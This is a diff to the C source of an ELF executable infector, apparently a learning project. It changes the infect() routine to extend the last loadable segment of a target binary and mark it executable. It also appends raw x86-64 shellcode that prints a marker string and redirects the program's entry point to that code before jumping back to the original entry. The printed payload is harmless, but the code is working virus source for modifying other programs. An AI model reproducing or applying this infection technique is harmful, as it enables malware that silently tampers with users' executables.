@@ -372,10 +372,14 @@ clean:
 #define MINIMAL_INJECTION_SIZE (0x1000 * 5)
 #define inout
 #define CURARE                                                                 \
-	"\x57\x56\x52\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x8d\x35\x12\x00" \
-	"\x00\x00\x41\xba\x01\x00\x00\x00\x0f\x05\x5a\x5e\x5f\xb8\x40\x10\x40\x00" \
-	"\xff\xe0\x68\x65\x68\x65\x68\x65\x68\x65\x0a\x00"
-#define FLOWER (sizeof(CURARE) - 1)
+	"\x57\x56\x52\x53\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x8d\x35\x2e" \
+	"\x00\x00\x00\xba\x0a\x00\x00\x00\x0f\x05\x48\x8d\x05\xdd\xff\xff\xff\x48" \
+	"\xbb\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x48\x29\xd8\x48\xbb\xbb\xbb\xbb\xbb" \
+	"\xbb\xbb\xbb\xbb\x48\x01\xd8\x5b\x5a\x5e\x5f\xff\xe0\x68\x65\x68\x65\x68" \
+	"\x65\x68\x65\x0a\x00"
+#define FLOWER	(sizeof(CURARE) - 1)
+#define ACONIT	38
+#define BUTOLIC 50
 
 int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 			   inout char **file_data)
@@ -421,6 +425,7 @@ void infect(char *path, void *begin_ptr)
 	t_elf		elf;
 	ElfW(Phdr) the_rats;
 	ElfW(Off) pt_load_end;
+	int last_pt_load;
 
 	if (parse_file(path, &statbuf, &elf, &file_data))
 		goto clean;
@@ -434,18 +439,19 @@ void infect(char *path, void *begin_ptr)
 	 *
 	 * 2/ PT_LOAD data, je fais kinda ce que je veux je crois :D
 	 */
-	if (elf.header->e_shoff
-		> elf.header->e_phoff + elf.header->e_phnum * elf.header->e_phentsize)
-		elf.header->e_shoff += 0x1000;
-	the_rats.p_type = PT_LOAD;
-	the_rats.p_offset
-		= elf.header->e_shoff + elf.header->e_shentsize * elf.header->e_shnum;
-	the_rats.p_filesz = 0x3000;
-	the_rats.p_memsz = 0x3000;
-	the_rats.p_align = 0x1000;
-	the_rats.p_vaddr = 0x405000 + (the_rats.p_offset % the_rats.p_align);
-	the_rats.p_paddr = the_rats.p_vaddr;
-	the_rats.p_flags = PF_X | PF_R;
+	pt_load_end = 0;
+	// if (elf.header->e_shoff
+	// 	> elf.header->e_phoff + elf.header->e_phnum * elf.header->e_phentsize)
+	// 	elf.header->e_shoff += 0x1000;
+	// the_rats.p_type = PT_LOAD;
+	// the_rats.p_offset
+	// 	= elf.header->e_shoff + elf.header->e_shentsize * elf.header->e_shnum;
+	// the_rats.p_filesz = 0x3000;
+	// the_rats.p_memsz = 0x3000;
+	// the_rats.p_align = 0x1000;
+	// the_rats.p_vaddr = 0x405000 + (the_rats.p_offset % the_rats.p_align);
+	// the_rats.p_paddr = the_rats.p_vaddr;
+	// the_rats.p_flags = PF_X | PF_R;
 	for (int i = 0; i < elf.header->e_phnum; i++)
 	{
 		// if (elf.segments[i].p_type == PT_DYNAMIC)
@@ -469,49 +475,72 @@ void infect(char *path, void *begin_ptr)
 		// 		case DT_RELA:
 		// 		case DT_VERNEED:
 		// 		case DT_VERSYM:
+		// 			ft_puthex(elf.header->e_phoff
+		// 					  + elf.header->e_phnum * elf.header->e_phentsize
+		// 					  + elf.segments[i].p_vaddr
+		// 					  - elf.segments[i].p_offset);
+		// 			ft_putchar('-');
+		// 			ft_puthex(pt_load_end + elf.segments[i].p_vaddr
+		// 					  - elf.segments[i].p_offset);
+		// 			ft_putchar('(');
+		// 			ft_puthex(dynamic->d_un.d_ptr);
+		// 			ft_putchar(')');
+		// 			ft_putchar('-');
+		// 			ft_putchar('-');
+		// 			ft_putchar('-');
+		// 			ft_puthex(dynamic->d_tag);
+		// 			ft_putchar(10);
 		// 			if (dynamic->d_un.d_ptr
 		// 					>= elf.header->e_phoff
 		// 						   + elf.header->e_phnum
 		// 								 * elf.header->e_phentsize
 		// 						   + elf.segments[i].p_vaddr
-		// 						   - elf.segments[i].p_offset
+		// 						   - elf.segments[i].p_offset - 0x1000
 		// 				&& dynamic->d_un.d_ptr
-		// 					   < elf.header->e_phoff
-		// 							 + (elf.header->e_phnum + 1)
-		// 								   * elf.header->e_phentsize
-		// 							 + elf.segments[i].p_vaddr
-		// 							 - elf.segments[i].p_offset)
+		// 					   < pt_load_end + elf.segments[i].p_vaddr
+		// 							 - elf.segments[i].p_offset - 0x1000)
 		// 				dynamic->d_un.d_ptr += sizeof(ElfW(Phdr));
 		// 		default:
 		// 			break;
 		// 		}
 		// 	}
-		if (elf.segments[i].p_offset
-			>= elf.header->e_phoff
-				   + elf.header->e_phnum * elf.header->e_phentsize)
-			elf.segments[i].p_offset += 0x1000;
-		else if (elf.segments[i].p_offset + elf.segments[i].p_filesz
-				 >= elf.header->e_phoff
-						+ elf.header->e_phnum * elf.header->e_phentsize)
+		// if (elf.segments[i].p_offset
+		// 	>= elf.header->e_phoff
+		// 		   + elf.header->e_phnum * elf.header->e_phentsize)
+		// 	elf.segments[i].p_offset += 0x1000;
+		// else if (elf.segments[i].p_offset + elf.segments[i].p_filesz
+		// 		 >= elf.header->e_phoff
+		// 				+ elf.header->e_phnum * elf.header->e_phentsize)
+		// {
+		// 	if (elf.segments[i].p_type == PT_LOAD)
+		// 		pt_load_end
+		// 			= elf.segments[i].p_offset + elf.segments[i].p_filesz;
+		// 	elf.segments[i].p_filesz += sizeof(ElfW(Phdr));
+		// 	elf.segments[i].p_memsz += sizeof(ElfW(Phdr));
+		// }
+		if (elf.segments[i].p_type == PT_LOAD
+			&& pt_load_end < elf.segments[i].p_vaddr + elf.segments[i].p_memsz)
 		{
-			if (elf.segments[i].p_type == PT_LOAD)
-				pt_load_end
-					= elf.segments[i].p_offset + elf.segments[i].p_filesz;
-			elf.segments[i].p_filesz += sizeof(ElfW(Phdr));
-			elf.segments[i].p_memsz += sizeof(ElfW(Phdr));
+			pt_load_end = elf.segments[i].p_vaddr + elf.segments[i].p_memsz;
+			last_pt_load = i;
 		}
 	}
-	for (int i = 0; i < elf.header->e_shnum; i++)
-	{
-		if (elf.sections[i].sh_offset
-			>= elf.header->e_phoff
-				   + elf.header->e_phnum * elf.header->e_phentsize)
-			elf.sections[i].sh_offset += 0x1000;
-		else if (elf.sections[i].sh_offset + elf.sections[i].sh_size
-				 >= elf.header->e_phoff
-						+ elf.header->e_phnum * elf.header->e_phentsize)
-			elf.sections[i].sh_size += sizeof(ElfW(Phdr));
-	}
+	elf.segments[last_pt_load].p_filesz = MINIMAL_INJECTION_SIZE
+										  + statbuf.st_size
+										  - elf.segments[last_pt_load].p_offset;
+	elf.segments[last_pt_load].p_memsz = elf.segments[last_pt_load].p_filesz;
+	elf.segments[last_pt_load].p_flags |= PF_X;
+	// for (int i = 0; i < elf.header->e_shnum; i++)
+	// {
+	// 	if (elf.sections[i].sh_offset
+	// 		>= elf.header->e_phoff
+	// 			   + elf.header->e_phnum * elf.header->e_phentsize)
+	// 		elf.sections[i].sh_offset += 0x1000;
+	// 	else if (elf.sections[i].sh_offset + elf.sections[i].sh_size
+	// 			 >= elf.header->e_phoff
+	// 					+ elf.header->e_phnum * elf.header->e_phentsize)
+	// 		elf.sections[i].sh_size += sizeof(ElfW(Phdr));
+	// }
 	// ft_memmove(file_data + elf.header->e_phoff
 	// 			   + elf.header->e_phnum * elf.header->e_phentsize
 	// 			   + sizeof(ElfW(Phdr)),
@@ -522,20 +551,28 @@ void infect(char *path, void *begin_ptr)
 	// 				  + elf.header->e_phnum * elf.header->e_phentsize));
 	// ft_memmove(file_data + pt_load_end + 0x1000, file_data + pt_load_end,
 	// 		   statbuf.st_size - pt_load_end);
-	ft_memmove(file_data + elf.header->e_phoff
-				   + elf.header->e_phnum * elf.header->e_phentsize + 0x1000,
-			   file_data + elf.header->e_phoff
-				   + elf.header->e_phnum * elf.header->e_phentsize,
-			   statbuf.st_size
-				   - (elf.header->e_phoff
-					  + elf.header->e_phnum * elf.header->e_phentsize));
-	memcpy(file_data + elf.header->e_phoff
-			   + elf.header->e_phnum * elf.header->e_phentsize,
-		   &the_rats, sizeof(ElfW(Phdr)));
-	elf.header->e_phnum++;
+	// ft_memmove(file_data + elf.header->e_phoff
+	// 			   + elf.header->e_phnum * elf.header->e_phentsize + 0x1000,
+	// 		   file_data + elf.header->e_phoff
+	// 			   + elf.header->e_phnum * elf.header->e_phentsize,
+	// 		   statbuf.st_size
+	// 			   - (elf.header->e_phoff
+	// 				  + elf.header->e_phnum * elf.header->e_phentsize));
+
+	// memcpy(file_data + elf.header->e_phoff
+	// 		   + elf.header->e_phnum * elf.header->e_phentsize,
+	// 	   &the_rats, sizeof(ElfW(Phdr)));
+	// elf.header->e_phnum++;
 	// ft_bzero(file_data + the_rats.p_offset, 0x3000);
-	// memcpy(file_data + the_rats.p_offset, CURARE, FLOWER);
-	// elf.header->e_entry = the_rats.p_vaddr;
+	ft_puthex(elf.segments[last_pt_load].p_vaddr
+			  + elf.segments[last_pt_load].p_memsz - MINIMAL_INJECTION_SIZE);
+	write(1, "\n", 1);
+	memcpy(file_data + statbuf.st_size, CURARE, FLOWER);
+	memcpy(file_data + statbuf.st_size + BUTOLIC, &elf.header->e_entry, 8);
+	elf.header->e_entry = elf.segments[last_pt_load].p_vaddr
+						  + elf.segments[last_pt_load].p_memsz
+						  - MINIMAL_INJECTION_SIZE;
+	memcpy(file_data + statbuf.st_size + ACONIT, &elf.header->e_entry, 8);
 	write(1, "OKKK\n", 5);
 clean:
 	ft_msync(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE, MS_SYNC);
